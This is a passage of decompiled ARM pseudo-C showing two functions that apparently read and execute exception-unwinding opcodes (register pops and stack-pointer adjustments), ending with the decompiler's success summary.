}

//----- (0000A9F8) --------------------------------------------------------
signed int __fastcall sub_A9F8(int a1)
{
  int v1; // r3@1
  char v2; // r2@2
  int v3; // r2@4
  signed int result; // r0@5
  int v5; // kr00_4@5

  v1 = a1;
  if ( *(_BYTE *)(a1 + 8) )
  {
    v2 = *(_BYTE *)(a1 + 8) - 1;
LABEL_5:
    *(_BYTE *)(a1 + 8) = v2;
    v5 = *(_DWORD *)a1 << 8;
    result = (unsigned __int64)*(_DWORD *)a1 >> 24;
    *(_DWORD *)v1 = v5;
    return result;
  }
  if ( *(_BYTE *)(a1 + 9) )
  {
    --*(_BYTE *)(a1 + 9);
    v3 = *(_DWORD *)(a1 + 4);
    *(_DWORD *)a1 = *(_DWORD *)v3;
    *(_DWORD *)(a1 + 4) = v3 + 4;
    v2 = 3;
    goto LABEL_5;
  }
  return 176;
}

//----- (0000AA50) --------------------------------------------------------
signed int __fastcall sub_AA50(int a1, int a2, int a3, int a4)
{
  int v4; // r5@1
  int v5; // r6@1
  signed int v6; // r7@1
  signed int v7; // r0@2
  char v8; // r4@2
  signed int result; // r0@4
  int v10; // r8@7
  int v11; // r8@7
  int v12; // r8@8
  int v13; // r3@11
  int v14; // r4@12
  int v15; // r2@18
  char v16; // zf@18
  int v17; // r2@25
  int v18; // r0@27
  signed int v19; // r1@27
  signed int v20; // r0@30
  char v21; // r0@34
  char v22; // r4@34
  int v23; // r1@35
  int v24; // r0@35
  char v25; // r0@39
  int v26; // r2@39
  int v27; // r3@39
  int v28; // r4@41
  int v29; // r2@43
  char v30; // r0@49
  signed int v31; // r0@52
  signed int v32; // r3@53
  int v33; // r2@56
  char v34; // r0@59
  int v35; // r2@59
  int v36; // r3@62
  int v37; // r2@64
  int v38; // [sp+Ch] [bp-24h]@1

  v38 = a4;
  v4 = a1;
  v5 = a2;
  v6 = 0;
  while ( 1 )
  {
    v7 = sub_A9F8(v5);
    v8 = v7;
    if ( v7 == 176 )
      break;
    if ( v7 & 0x80 )
    {
      v13 = v7 & 0xF0;
      if ( (unsigned __int8)(v7 & 0xF0) == 128 )
      {
        v14 = sub_A9F8(v5) | (v7 << 8);
        if ( v14 == 32768 || sub_A2C0(v4, 0, 16 * v14 & 0xFFFF, 0) )
          return 9;
        if ( 16 * (_WORD)v14 & 0x8000 )
          v6 = 1;
      }
      else if ( v13 == 144 )
      {
        v15 = v7 & 0xF;
        v16 = (v7 & 0xF) == 13;
        if ( (v7 & 0xF) != 13 )
          v16 = v15 == 15;
        if ( v16 )
          return 9;
        sub_9E38(v4, 0, v15, 0, (unsigned int)&v38);
        sub_9EA4(v4, 0, 0xDu, 0, (unsigned int)&v38);
      }
      else
      {
        if ( v13 == 160 )
        {
          v17 = (4080 >> (~(_BYTE)v7 & 7)) & 0xFF0;
          if ( v7 & 8 )
            v17 |= 0x4000u;
          v18 = v4;
          v19 = 0;
          goto LABEL_57;
        }
        if ( v13 == 176 )
        {
          if ( v7 == 177 )
          {
            v20 = sub_A9F8(v5);
            v17 = v20;
            if ( !v20 )
              return 9;
            v19 = v20 & 0xF0;
            if ( v20 & 0xF0 )
              return 9;
            v18 = v4;
            goto LABEL_57;
          }
          if ( v7 != 178 )
          {
            if ( v7 == 179 )
            {
              v25 = sub_A9F8(v5);
              v19 = 1;
              v26 = v25 & 0xF0;
              v27 = (v25 & 0xF) + 1;
              v18 = v4;
              goto LABEL_50;
            }
            if ( (unsigned __int8)(v7 & 0xFC) == 180 )
              v28 = v7 & 3;
            else
              v28 = v7 & 7;
            v29 = v28 + 1;
            if ( (unsigned __int8)(v7 & 0xFC) == 180 )
            {
              v18 = v4;
              v19 = 2;
              v17 = v29 | 0x40000;
            }
            else
            {
              v18 = v4;
              v19 = 1;
              v17 = v29 | 0x80000;
            }
LABEL_57:
            v32 = v19;
            goto LABEL_66;
          }
          sub_9E38(v4, 0, 0xDu, 0, (unsigned int)&v38);
          v21 = sub_A9F8(v5);
          v22 = 2;
          while ( 1 )
          {
            v23 = v21 & 0x80;
            v16 = (unsigned __int8)(v21 & 0x80) == 0;
            v24 = v21 & 0x7F;
            if ( v16 )
              break;
            v38 += v24 << v22;
            v22 += 7;
            v21 = sub_A9F8(v5);
          }
          v38 += 516 + (v24 << v22);
          sub_9EA4(v4, v23, 0xDu, v23, (unsigned int)&v38);
        }
        else
        {
          if ( v13 != 192 )
          {
            if ( (unsigned __int8)(v7 & 0xF8) != 208 )
              return 9;
            v37 = (v7 & 7) + 1;
            v18 = v4;
            v19 = 1;
            v17 = v37 | 0x80000;
            goto LABEL_65;
          }
          if ( v7 == 198 )
          {
            v30 = sub_A9F8(v5);
            v19 = 3;
            v26 = v30 & 0xF0;
            v27 = (v30 & 0xF) + 1;
            v18 = v4;
LABEL_50:
            v17 = v27 | (v26 << 12);
            goto LABEL_57;
          }
          if ( v7 != 199 )
          {
            if ( (unsigned __int8)(v7 & 0xF8) != 192 )
            {
              if ( v7 == 200 )
              {
                v34 = sub_A9F8(v5);
                v35 = (unsigned __int8)(v34 & 0xF0) + 16;
              }
              else
              {
                if ( v7 != 201 )
                  return 9;
                v34 = sub_A9F8(v5);
                v35 = v34 & 0xF0;
              }
              v36 = (v34 & 0xF) + 1;
              v18 = v4;
              v19 = 1;
              v17 = v36 | (v35 << 12);
LABEL_65:
              v32 = 5;
              goto LABEL_66;
            }
            v33 = (v7 & 0xF) + 1;
            v18 = v4;
            v19 = 3;
            v17 = v33 | 0xA0000;
            goto LABEL_57;
          }
          v31 = sub_A9F8(v5);
          v17 = v31;
          if ( !v31 )
            return 9;
          v32 = v31 & 0xF0;
          if ( v31 & 0xF0 )
            return 9;
          v18 = v4;
          v19 = 4;
LABEL_66:
          if ( sub_A2C0(v18, v19, v17, v32) )
            return 9;
        }
      }
    }
    else
    {
      v10 = (unsigned __int8)(4 * v7);
      sub_9E38(v4, 0, 0xDu, 0, (unsigned int)&v38);
      v11 = v10 + 4;
      if ( v8 & 0x40 )
        v12 = v38 - v11;
      else
        v12 = v38 + v11;
      v38 = v12;
      sub_9EA4(v4, 0, 0xDu, 0, (unsigned int)&v38);
    }
  }
  if ( v6 )
  {
    result = 0;
  }
  else
  {
    sub_9E38(v4, 0, 0xEu, 0, (unsigned int)&v38);
    sub_9EA4(v4, 0, 0xFu, 0, (unsigned int)&v38);
    result = 0;
  }
  return result;
}

// ALL OK, 47 function(s) have been successfully decompiled
